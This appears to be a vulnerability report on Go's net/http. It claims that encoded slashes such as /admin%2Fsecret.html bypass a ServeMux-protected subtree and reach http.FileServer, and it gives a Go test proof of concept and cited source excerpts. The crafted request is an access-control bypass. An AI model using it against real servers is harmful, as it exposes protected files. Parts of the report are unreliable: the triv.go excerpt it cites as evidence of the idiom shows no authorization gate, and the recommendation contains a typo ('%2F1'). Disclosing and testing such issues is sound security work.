### Title
`net/http.ServeMux` routing and `http.FileServer`/`fileHandler.ServeHTTP` decode `%2F` inconsistently, letting encoded slashes bypass subtree route protections for statically served files - (File: src/net/http/server.go, src/net/http/fs.go)

### Summary
`ServeMux.findHandler` matches routes against `r.URL.EscapedPath()` and explicitly treats `%2F`/`%2E` as non-separators during segment-by-segment matching, so a pattern like `/admin/` never matches a request whose only "slash" in that position is percent-encoded. `http.FileServer`'s `fileHandler.ServeHTTP`, however, operates on `r.URL.Path`, which the URL parser has already decoded (`%2F` → `/`), and resolves it against the filesystem with `path.Clean`. When both a protecting subtree pattern and a catch-all static handler are registered on the same mux, a request such as `/admin%2Fsecret.html` fails to match the `/admin/` pattern but is served by the file handler as `/admin/secret.html`, exactly mirroring the `@hono/node-server` GHSA-wc8c-qw6v-h7f6 class of bug.

### Finding Description
Attacker sends `GET /admin%2Fsecret.html` to a server built with `http.NewServeMux()` that registers `mux.Handle("/admin/", authMiddleware)` and `mux.Handle("/", http.FileServer(http.Dir(root)))` sharing the same root.

- Routing: `ServeMux.findHandler` reads `escapedPath := r.URL.EscapedPath()` [1](#0-0)  and calls `cleanPath`/`matchOrRedirect`, which route through `routingNode.matchPath`/`firstSegment`. `firstSegment` splits only on a literal `/` byte and unescapes each segment independently [2](#0-1) , and the package doc states this is intentional: “Escaped path elements such as `%2e` for `.` and `%2f` for `/` are preserved and aren't considered separators for request routing.” [3](#0-2) . Consequently `admin%2Fsecret.html` is one segment that unescapes to `admin/secret.html`, which does not literal-match the segment `admin` required by pattern `/admin/`, so the request falls through to the `/` catch-all.
- Sink: The `/` pattern's handler is `http.FileServer`. `fileHandler.ServeHTTP` takes `upath := r.URL.Path` (the already `%2F`-decoded path produced by `url.Parse`) and calls `serveFile(w, r, f.root, path.Clean(upath), true)` [4](#0-3) . Because `r.URL.Path` has the literal slash restored, `path.Clean` yields `/admin/secret.html`, and `serveFile`/`fs.Open` [5](#0-4)  opens and serves that file directly from the shared root — the same file the `/admin/` middleware was meant to gate.

This is the same primitive as the reported advisory: routing/middleware matching and static-file path resolution decode `%2F` differently, so protection logic and the file-serving logic disagree about where the "admin" subtree boundary is.

### Impact Explanation
Any application that (a) uses `net/http.ServeMux` to gate a path subtree with auth/authorization middleware and (b) serves static content for that same tree (or a shared root) via `http.FileServer`/`http.FileServerFS` on a broader catch-all pattern, can have the protected file served without the middleware ever executing. This is an authorization/access-control bypass (confidentiality impact), matching CWE-863, and would sit on Go's PUBLIC track as a documentation/behavioral hardening issue for `net/http`, since exploitation requires an application pattern (protecting a static subpath rather than gating access at the file-opening layer) that the stdlib doesn't prevent by construction.

### Likelihood Explanation
The victim workflow is a normal unauthenticated attacker sending a single crafted GET request to a publicly reachable Go HTTP server; no special privileges, TLS tampering, or local access is required. The precondition (a subtree pattern used purely for authorization while a sibling/parent catch-all pattern is a file server over the same root) is a common idiom seen in the very examples shipped in this repo (e.g. `http.Handle("/go/", http.StripPrefix(...))` combined with a catch-all `http.Handle("/", ...)` in `src/net/http/triv.go:130-133`) [6](#0-5) .

### Recommendation
Document explicitly (and ideally guard in `fileHandler.ServeHTTP`) that `http.FileServer`/`http.FileServerFS` must not be relied upon to respect route-based authorization boundaries when `%2F`-containing paths are possible; either have the file handler reject requests where `r.URL.EscapedPath()` contains `%2f`/`%2F1` before falling back to the decoded `r.URL.Path`, or require applications to perform authorization checks inside the handler chain that actually serves the bytes (e.g., wrap `http.FileServer` itself with the auth check) rather than relying solely on `ServeMux` subtree pattern separation.

### Proof of Concept
```go
package http_test

import (
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

func TestAdminBypassViaEncodedSlash(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "admin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "admin", "secret.html"), []byte("TOP-SECRET"), 0o644); err != nil {
		t.Fatal(err)
	}

	mux := http.NewServeMux()
	// "Protects" /admin/ subtree.
	mux.Handle("/admin/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
	}))
	// Catch-all static file server over the SAME root.
	mux.Handle("/", http.FileServer(http.Dir(root)))

	ts := httptest.NewServer(mux)
	defer ts.Close()

	// Direct access must be blocked by the "middleware".
	res, _ := ts.Client().Get(ts.URL + "/admin/secret.html")
	if res.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected direct access blocked, got %d", res.StatusCode)
	}

	// Encoded-slash bypass reaches the file server instead of the /admin/ handler.
	res, err := ts.Client().Get(ts.URL + "/admin%2Fsecret.html")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(res.Body)
	res.Body.Close()

	if res.StatusCode == http.StatusOK && string(body) == "TOP-SECRET" {
		t.Fatalf("authorization bypass: got 200 with protected content via %%2F, body=%q", body)
	}
}
```
Expected (vulnerable) result: the second request returns `200 OK` with body `TOP-SECRET`, proving the `/admin/` protection handler was skipped by `ServeMux` routing while `http.FileServer` still resolved and served the protected file.

### Citations

**File:** src/net/http/server.go (L2742-2748)
```go
// # Request sanitizing
//
// ServeMux also takes care of sanitizing the URL request path and the Host
// header, stripping the port number and redirecting any request containing . or
// .. segments or repeated slashes to an equivalent, cleaner URL.
// Escaped path elements such as "%2e" for "." and "%2f" for "/" are preserved
// and aren't considered separators for request routing.
```

**File:** src/net/http/server.go (L2856-2859)
```go
	var n *routingNode
	host := r.URL.Host
	escapedPath := r.URL.EscapedPath()
	path := escapedPath
```

**File:** src/net/http/routing_tree.go (L201-215)
```go
// firstSegment splits path into its first segment, and the rest.
// The path must begin with "/".
// If path consists of only a slash, firstSegment returns ("/", "").
// The segment is returned unescaped, if possible.
func firstSegment(path string) (seg, rest string) {
	if path == "/" {
		return "/", ""
	}
	path = path[1:] // drop initial slash
	i := strings.IndexByte(path, '/')
	if i < 0 {
		i = len(path)
	}
	return pathUnescape(path[:i]), path[i:]
}
```

**File:** src/net/http/fs.go (L681-698)
```go
func serveFile(w ResponseWriter, r *Request, fs FileSystem, name string, redirect bool) {
	const indexPage = "/index.html"

	// redirect .../index.html to .../
	// can't use Redirect() because that would make the path absolute,
	// which would be a problem running under StripPrefix
	if strings.HasSuffix(r.URL.Path, indexPage) {
		localRedirect(w, r, "./")
		return
	}

	f, err := fs.Open(name)
	if err != nil {
		msg, code := toHTTPError(err)
		serveError(w, msg, code)
		return
	}
	defer f.Close()
```

**File:** src/net/http/fs.go (L996-1003)
```go
func (f *fileHandler) ServeHTTP(w ResponseWriter, r *Request) {
	upath := r.URL.Path
	if !strings.HasPrefix(upath, "/") {
		upath = "/" + upath
		r.URL.Path = upath
	}
	serveFile(w, r, f.root, path.Clean(upath), true)
}
```

**File:** src/net/http/triv.go (L129-134)
```go
	http.Handle("/counter", ctr)
	http.Handle("/", http.HandlerFunc(Logger))
	if *webroot != "" {
		http.Handle("/go/", http.StripPrefix("/go/", http.FileServer(http.Dir(*webroot))))
	}
	http.Handle("/chan", ChanCreate())
```
